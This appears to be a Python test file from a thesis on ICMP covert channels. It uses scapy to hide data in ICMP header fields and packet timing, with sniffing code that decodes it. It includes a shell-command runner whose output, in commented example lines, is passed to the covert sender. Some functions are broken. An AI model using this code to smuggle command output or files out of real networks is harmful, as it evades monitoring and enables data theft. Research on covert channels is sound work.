from mymethods import *  
from scapy.all import *
from attacksingleton  import *
import datetime, ipaddress 
import re 
import time 

data="echo 'Ciao'".encode() 

def test_printTimestamp():
    for index in range(0, len(data), 5): 
        try:
            icmp_id=(data[index]<<8)+data[index+1]  
            print(f"ICMP id: {icmp_id}")
        except IndexError as e: 
            #print(f"Index error: {e}")
            icmp_id=(data[index]<<8)
            print(f"ICMP id: {icmp_id}")
            exit()
        except Exception as e:
            exit()
        current_time=datetime.datetime.now(datetime.timezone.utc) 
        midnight = current_time.replace(hour=0, minute=0, second=0, microsecond=0) 

        data_pkt=int.from_bytes(data[index+2:index+3]) *10**3
        current_time=current_time.replace(microsecond=data_pkt)
        icmp_ts_ori=int((current_time - midnight).total_seconds() * 1000) 
        print(f"Byte data: {data[index+2:index+3]}")
        print(f"Data pkt: {data_pkt}")
        print(f"Timestamp: {icmp_ts_ori}") 
    
        data_pkt=int.from_bytes(data[index+3:index+4]) *10**3 
        if current_time.second+1<60:
            current_time=current_time.replace(
                second=current_time.second+1, microsecond=data_pkt
            ) 
        else:
            current_time=current_time.replace(
                minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt
            ) 
        icmp_ts_rx=int((current_time - midnight).total_seconds() * 1000) 
        print(f"Byte data: {data[index+3:index+4]}")
        print(f"Data pkt: {data_pkt}")
        print(f"Timestamp: {icmp_ts_rx}")

        data_pkt=int.from_bytes(data[index+4:index+5]) *10**3 
        if current_time.second+1<60: 
            current_time=current_time.replace(
                second=current_time.second+1, microsecond=data_pkt
            )
        else: 
            current_time=current_time.replace(
                minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt
            )
        icmp_ts_tx=int((current_time - midnight).total_seconds() * 1000) 
        print(f"Byte data: {data[index+4:index+5]}")
        print(f"Data pkt: {data_pkt}")
        print(f"Timestamp: {icmp_ts_tx}")

def test_decodeData_fromPackets():
    packet_list=[]
    data="echo 'Ciao'".encode()
    ip_dst=ipaddress.ip_address("192.168.1.17")
    def ipv4_destination_unreachable(data:bytes=None, ip_dst:ipaddress.IPv4Address=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_dst):
                raise Exception(f"test_decodeData_fromPackets: Argoemnti non corretti")
            if ip_dst.version!=4:
                print(f"IP version is not 4: {ip_dst.version}")
                return False
            interface=IP_INTERFACE.iface_from_IP(ip_dst) 
            TYPE_DESTINATION_UNREACHABLE=3 
            ip_dst=ipaddress.ip_address("192.168.1.17")
            for index in range(0, len(data), 8):
                dummy_ip=IP(src=ip_dst.compressed, dst="8.8.8.8", len=int.from_bytes(data[index+4:index+6])) / \
                    ICMP(id=int.from_bytes(data[index+6:index+8]))
                pkt= IP(dst=ip_dst.compressed)/\
                    ICMP(type=TYPE_DESTINATION_UNREACHABLE, unused=int.from_bytes(data[index:index+4]) )/\
                    Raw(load=bytes(dummy_ip)[:28])
                #print(f"Sending {pkt.summary()}") 
                print(f"Data: {data[index:index+4]}\t{int.from_bytes(data[index:index+4])}")
                print(f"Data: {data[index+4:index+6]}\t{int.from_bytes(data[index+4:index+6])}") 
                print(f"Data: {data[index+6:index+8]}\t{int.from_bytes(data[index+6:index+8])}")
                print(pkt.summary())
                packet_list.append(pkt)
                #if pkt:
                #    ans = send(pkt, verbose=1, iface=interface) 
            dummy_ip=IP(src=ip_dst.compressed, dst="8.8.8.8") / ICMP(id=0,seq=1)
            pkt= IP(dst=ip_dst.compressed)/ICMP(type=TYPE_DESTINATION_UNREACHABLE)/Raw(load=bytes(dummy_ip)[:28])
            #print(f"Sending {pkt.summary()}")  
            print(f"interface: {interface}")
            packet_list.append(pkt)
            #ans = send(pkt, verbose=1, iface=interface) 
            #if ans: 
            #    return True  
            #return False 

    ipv4_destination_unreachable(data, ip_dst)
    print(packet_list)
    print(len(packet_list)) 

    decoded_data=[]
    TYPE_DESTINATION_UNREACHABLE=3 
    for pkt in packet_list:
        if pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt.haslayer(Raw): 
            inner_ip = IP(pkt[Raw].load)
            if inner_ip[ICMP].id==0 and inner_ip[ICMP].seq==1: 
                break 
            elif not inner_ip: 
                print("Pacchetto non ha livello IP error\t",pkt)
                break
            unused_int = pkt[ICMP].unused
            if isinstance(unused_int, bytes): 
                decoded_data.append(unused_int.decode().lstrip('\x00').rstrip('\x00')) 
            elif isinstance(unused_int, int): 
                decoded_data.append(unused_int.to_bytes(4, "big").decode().lstrip('\x00').rstrip('\x00')) 
            decoded_data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
            decoded_data.append(inner_ip[ICMP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
            
            #if pkt[ICMP][ICMPerror].id==0 and pkt[ICMP][ICMPerror].seq==1: 
                #print("AAAA")
                #print(decoded_data)
            #elif pkt[ICMP].type==TYPE_DESTINATION_UNREACHABLE and not inner_ip.haslayer(IP): #packet.haslayer(Padding):
                #THREADING_EVENT.set(event_pktconn)
                #exit(0)
                #print("Pacchetto non ha livello IP error\t",pkt)
    print(decoded_data)

def write_1000_ciao():
    with open("1000_ciao.txt", "w",encoding="utf-8") as file:
        print( [hex(ord(caracter)) for caracter in "Ciao"])
        print(''.join(hex(ord(char)) for char in "Ciao"))
        for i in range(1,1000):
            file.write("Ciao"*i)
            #file.write("\n")

def write_100_banana():
    with open("100_banana.txt", "w",encoding="utf-8") as file:
        print( [hex(ord(caracter)) for caracter in "Banana"])
        print(''.join(hex(ord(char)) for char in "Banana"))
        for i in range(1,100):
            file.write("Banana"*i)
            #file.write("\n")

def read_100_ciao_hex():
    with open("100_ciao.txt", "r",encoding="utf-8") as file: 
        for chunk in iter(lambda: file.read(16), ''):
            print( chunk.encode('utf-8').hex() ) 

def read_files():
    with open("_get_over_you.txt","r",encoding="utf-8") as read_file: 
        contenuto=[]
        for line in read_file.readlines():
            print(len(line), len(line.encode()),end=" ")
            contenuto.append(len(line.encode())) 
        x=0
        for length in contenuto:
            x+=length
        print(x)

    print("#----------------------")
    with open("100_ciao.txt","r",encoding="utf-8") as read_file: 
        contenuto=[]
        for line in read_file.readlines():
            print(len(line), len(line.encode()),end=" ")
            contenuto.append(len(line.encode()))
        x=0
        for length in contenuto:
            x+=length
        print(x)

def send_receive_Singleton():
    def test_ReceiveSingleton():
        final_data=[]
        ip_dst=ipaddress.ip_address("192.168.1.3")
        ip_src=ipaddress.ip_address("192.168.1.17")
        ReceiveSingleton.ipv4_timestamp_request(ip_dst, final_data, ip_src)
        print("Dati ricevuti: ", final_data) 

    def test_SendSingleton(data:bytes=None):
        if not data or not IS_TYPE.bytes(data):
            data="Dato mandato da computer di Marco".encode()
        ip_dst=ipaddress.ip_address("192.168.1.17")
        SendSingleton.ipv4_information_reply(data=data, ip_dst=ip_dst) 
        #ipv4_timestamp_reply warnings MAC address 

#-----------------------------------------------
def esegui_comando(comando): 
    print(comando)
    cwd = r"D:\Tesi Magistrale\implementazione\unione\scelta_type"
    try:
        # Esegui il comando e cattura output e errori
        risultato = subprocess.run(
            comando
            ,shell=True, check=True 
            ,stdout=subprocess.PIPE, stderr=subprocess.PIPE
            #,cwd=cwd
        )
        codifiche=["utf-8", "cp1252", "cp850", "cp437"] #Windows chcp da la codifca sistema ->cp{val_preso}
        index_codifiche=0
        while True:
            try: 
                stderr=risultato.stderr.decode(codifiche[index_codifiche], errors="replace") 
                stdout=risultato.stdout.decode(codifiche[index_codifiche], errors="replace")
                print("Err", stderr)
                print("Out", stdout)
                if stderr:
                    stdout += "\n[Errore]\n" + stderr
                return stdout 
            except UnicodeDecodeError as e: 
                if index_codifiche>=len(codifiche): 
                    raise Exception("esegui_comando: Codifica testo sconosciuta")
                index_codifiche+=1
    except subprocess.CalledProcessError as e: 
        stderr = e.stderr.decode("utf-8", errors="replace") if e.stderr else str(e)
        return f"Errore durante l'esecuzione del comando:\n{stderr}" 

# Esempio di utilizzo
#comando = "echo Ciao Mondo" 
#comando=r"cd 'D:\Tesi Magistrale\implementazione\unione\scelta_type' & dir" #"cd 'D:\\Tesi Magistrale\\implementazione\\unione\\scelta_type'; ls"
#comando=r"type _get_over_you.txt" 
#comando=r"type 100_ciao.txt" 
#comando=r"type 100_banana.txt" 
#comando=r"type 1000_ciao.txt"
#output = esegui_comando(comando)
#print(output) 
#test_SendSingleton(output.encode()) 

def test_1st_last_4bit(): 
    #return primi_4, ultimi_4
    data="echo 'Ciao'".encode()
    for index in data:
        print("Index:", index, bin(index))
        print("Primi 4 bit:", (index& 0b11110000)>>4)
        print("Ultimi 4 bit:", index& 0b00001111)
        print("")  

#-----------------------------------------------
def get_1st_last_4bit(numero:int):
    #Da un byte ricava i primi 4 bit e gli ultimi 4 bit 
    if not IS_TYPE.integer(numero):
        raise Exception("get_1st_last_4bit:Argomento non valido")
    primi_4=(numero& 0b11110000)>>4
    ultimi_4=numero& 0b00001111 
    return primi_4, ultimi_4 


def get_lista_codici(): 
    #Lista degli interi tipologia+codice
    return [
        30,31,32,33,34,35 #destination unreachable
        ,110,111 #time exceeded
        ,120 #parameter problem
        ,40 #source quench
        ,50,51,52,53 #redirect
        ,80#, 0 #echo request/reply
        ,130#, 140 #timestamp request/reply
        ,150#, 160 #info request/reply
    ]


def get_codice_bit():
    #Ritorna il dizionario in cui si associa ad un codice  (con codice=tipologia+coddice ICMP) l'intero associato 
    codice_bit={}
    lista_codici=get_lista_codici()
    #Associo ad ogni intero da 0 sino a 16 il proprio messaggio ICMP
    for index in range(0,len(lista_codici)):
        #print("Coppia:\t",index, lista_codici[index])
        codice_bit.update({lista_codici[index]:index})
    return codice_bit 

def get_bit_codice():
    #Ritorna il dizionario in cui si associa a un intero il codice associato (con codice=tipologia+coddice ICMP)
    bit_codice={}
    lista_codici=get_lista_codici()
    #Associo ad ogni intero da 0 sino a 16 il proprio messaggio ICMP
    for index in range(0,len(lista_codici)):
        #print("Coppia:\t",index, lista_codici[index])
        bit_codice.update({index:lista_codici[index]})
    return bit_codice 


def get_tipologia_codice_str(stringa:str=None): 
    #Data una stringa ritorna la tipologia di messaggio ICMP e il codice relativo
    if not IS_TYPE.string(stringa):
        print("Argomento non corretto") 
        return None,None
    if not re.match(r"^[0-9]{2,3}$",stringa): 
        print(f"Stringa non valida {stringa}")  
        return None,None
    lista_codici=get_lista_codici() 
    if int(stringa) not in lista_codici: 
        print(f"Codice stringa non valido: {stringa}")
        return None,None
    print("Stringa passata:", stringa) 
    codice= stringa.lower().strip()[-1]
    tipologia= stringa.lower().strip()[:-1] 
    print("Codice:", codice, "Tipologia:", tipologia)
    return tipologia, codice 

def get_tipologia_codice_int(numero:int=None): 
    #Dato un intero ritorna la tipologia di messaggio ICMP e il codice relativo
    if not IS_TYPE.integer(numero):
        print("Argomento non corretto") 
        return None,None 
    lista_codici=get_lista_codici() 
    if numero not in lista_codici: 
        print(f"Codice non valido: {numero}")
        return None,None
    print("Codice passato:", numero) 
    codice= numero%10
    tipologia= numero//10
    print("Codice:", codice, "Tipologia:", tipologia)
    return tipologia, codice


def get_tipologia_byte(): 
    #Ritorna un dizionario in cui si associa ad una tipologi di messaggio ICMP i byte trasportabili
    return {
        15:2, 16:2 #information
        ,13:5,14:5 #timestamp
        ,8:2, 0:2 #echo
        ,5:4 #redirect
        ,4:8 #quench
        ,12:7 #problem
        ,11:6 #time_exceeded
        ,3:8 #destination_unreachable
    }

def send_data(tipologia:int=None, data:str=None, ip_dst:ipaddress=None): 
    if not(IS_TYPE.integer(tipologia) and IS_TYPE.string(data) and IS_TYPE.ipaddress(ip_dst)): 
        raise Exception("send_data: Argomenti non corretti") 
    data=data.encode() 
    match tipologia: 
        case 15: print("ipv4_information_reply")
        case 16: print("ipv4_information_reply")
        case 13: print("ipv4_timestamp_reply")
        case 14: print("ipv4_timestamp_reply")
        case 8: print("ipv4_echo_reply")
        case 0: print("ipv4_echo_reply")
        case 5: print("ipv4_redirect")
        case 4: print("ipv4_source_quench")
        case 12: print("ipv4_parameter_problem")
        case 11: print("ipv4_time_exceeded")
        case 3: print("ipv4_destination_unreachable")
    return
    match tipologia: 
        case 15: SendSingleton.ipv4_information_reply(data=data, ip_dst=ip_dst)  
        case 16: SendSingleton.ipv4_information_reply(data=data, ip_dst=ip_dst) 
        case 13: SendSingleton.ipv4_timestamp_reply(data=data, ip_dst=ip_dst) 
        case 14: SendSingleton.ipv4_timestamp_reply(data=data, ip_dst=ip_dst) 
        case 8: SendSingleton.ipv4_echo_reply(data=data, ip_dst=ip_dst) 
        case 0: SendSingleton.ipv4_echo_reply(data=data, ip_dst=ip_dst) 
        case 5: SendSingleton.ipv4_redirect(data=data, ip_dst=ip_dst) 
        case 4: SendSingleton.ipv4_source_quench(data=data, ip_dst=ip_dst) 
        case 12: SendSingleton.ipv4_parameter_problem(data=data, ip_dst=ip_dst) 
        case 11: SendSingleton.ipv4_time_exceeded(data=data, ip_dst=ip_dst) 
        case 3: SendSingleton.ipv4_destination_unreachable(data=data, ip_dst=ip_dst) 



def test_timing_channel8bit(data:bytes=None, ip_dst:ipaddress=None, stop_value: int = 255): 
    if not (IS_TYPE.ipaddress(ip_dst)):
        raise Exception("test_timing_channel8bit: Argomenti non validi") 
    if not IS_TYPE.bytes(data): 
        data="echo 'Ciao'".encode()
    #old_time=current_time=datetime.datetime.now()
    old_time=current_time=time.perf_counter()
    min_sec_delay=1 #originale 0
    max_sec_delay=30 #originale 255

    target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
    interface=IP_INTERFACE.iface_from_IP(ip_dst)

    pkt = Ether(dst=target_mac)/IP(dst=ip_dst.compressed)/ICMP() / data 
    sendp(pkt, verbose=1, iface=interface)
    for byte in data: 
        current_time=time.perf_counter()
        print(f"Current time: {current_time}")

        delay=min_sec_delay+(byte/255)*(max_sec_delay-min_sec_delay)
        print(f"Delay :{byte}\t{delay}\n")
        #print(f"Data: {byte}\t{byte-31}\t{type(byte)}\n") 
        time.sleep(delay) 
         
        print(f"Interfaccia per destinazione: {interface}")
        pkt = Ether(dst=target_mac)/IP(dst=ip_dst.compressed)/ICMP() / data 
        print(f"Sending {pkt.summary()}") 
        sendp(pkt, verbose=1, iface=interface)

        old_time=current_time 
        current_time=time.perf_counter()
        print(f"Current time: {current_time}")
        print(f"Time difference: {current_time-old_time}\n") 
    stop_delay = min_sec_delay + (stop_value / 255) * (max_sec_delay - min_sec_delay)
    print(f"[STOP] Inviando byte di stop {stop_value} dopo {stop_delay}") 
    time.sleep(stop_delay)  # opzionale, per separarlo dal resto 
    pkt = Ether(dst=target_mac)/IP(dst=ip_dst.compressed)/ICMP() / data 
    print(f"Sending {pkt.summary()}") 
    sendp(pkt, verbose=1, iface=interface)

data="Dato mandato dal computer di Marco per testare un timing channel a 8 bit".encode()
ip_dst=ipaddress.ip_address("192.168.1.17") 
test_timing_channel8bit(data, ip_dst)

def test_receive_timing_channel8bit(ip_dst:ipaddress=None, stop_value=255): 
    if not(istype.ipaddress(ip_dst)): 
        raise Exception("Argomenti non validi")
    min_sec_delay=1 #originale 0
    max_sec_delay=30 #originale 255
    previous_time=None 
    stop_flag={"value":False}
    start_time=end_time=None
    received_data=[]

    def decode_byte(delay):
        #(byte/255)=(delay-min_sec_delay)/(max_sec_delay-min_sec_delay)
        ratio = (delay - min_sec_delay) / (max_sec_delay - min_sec_delay)
        byte=int(round(ratio*255)) 
        return byte 
    
    def callback_timing_channel8bit(pkt):
        nonlocal previous_time, start_time, end_time 
        if ICMP in pkt and (pkt[ICMP].type==8 or pkt[ICMP].type==0): 
            #current_time=datetime.datetime.now() 
            current_time=time.perf_counter()
            if previous_time is not None: 
                delta=(current_time-previous_time).total_seconds() 
                byte=decode_byte(delta) 
                print(f"Delta:{delta} -> Byte:{byte} Char:{chr(byte)}") 
                received_data.append(chr(byte)) 
                if byte==stop_value:
                    stop_flag["value"]=True
                    end_time=pkt.time
            else: start_time=pkt.time
            previous_time=current_time 
    
    def stop_filter(pkt): 
        return stop_flag["value"]
    
    print("In ascolto dei pacchetti ICMP...")
    sniff(
        filter=f"icmp and dst host {ip_dst.compressed}"
        ,prn=callback_timing_channel8bit
        ,store=False
        ,stop_filter=stop_filter
    ) 
    print(f"Dati ricevuti: {received_data}") 
    received_data="".join(x for x in received_data)
    print(f"Dati ricevuti: {received_data}")
    print(f"Tempo di esecuzione: {end_time-start_time}")

#test_receive_timing_channel8bit(ip_dst)

def test_hybrid_channel(message:bytes=None):
    if not message or not IS_TYPE.bytes(message):
        raise Exception("test_hybrid_channel: Argomento non corretto")
    min_sec_delay=1 #originale 0
    max_sec_delay=25 #originale 255
    codice_bit=get_codice_bit()
    print("Codici bit: ", codice_bit)

    index=0
    while index< len(message): 
        #Byte 1 - timing channel 
        delay=min_sec_delay+(message[index]/255)*(max_sec_delay-min_sec_delay) 
        print(f"Delay :{index}\t{delay}\t{delay.total_seconds()}\n")
        time.sleep(delay)
        fine_dati=index+1

        #Byte 2 - Codice ICMP 
        if not (index+1 < len(message)):
            print("Fine messaggio")
            return
        codice=message[index+1]
        primi_4bit=(codice& 0b11110000)>>4
        ultimi_4bit=codice& 0b00001111
        print("Primi 4 bit:", primi_4bit, "Ultimi 4 bit:", ultimi_4bit) 
        print("Codice ICMP da inviare:", codice_bit[primi_4bit], codice_bit[ultimi_4bit]) 
        prima_tipologia, primo_codice=get_tipologia_codice(codice_bit[primi_4bit])
        seconda_tipologia, secondo_codice=get_tipologia_codice(codice_bit[ultimi_4bit])
        print("Primi bit messaggio ICMP :", prima_tipologia, primo_codice)
        print("Ultimi bit messaggio ICMP:", seconda_tipologia, secondo_codice) 
        fine_dati+=1

        #Invio pacchetto ICMP in base alla tipologia e al codice
        tipologia_byte=get_tipologia_byte()
        byte_primibit=tipologia_byte.get(prima_tipologia)
        byte_ultimibit=tipologia_byte.get(seconda_tipologia)
        print("Byte messaggio primi bit", byte_primibit) 
        print("Byte messaggio ultimi bit", byte_ultimibit) 
        inizio_dati=fine_dati #con fine_dati=index+2
        fine_dati=index+2+byte_primibit
        sotto_dati=message[inizio_dati:fine_dati]
        print("Primi dati:", sotto_dati)
        inizio_dati=fine_dati
        fine_dati=inizio_dati+byte_ultimibit
        sotto_dati=message[inizio_dati:fine_dati]
        print("Ultimi dati:", sotto_dati)

        index=fine_dati

















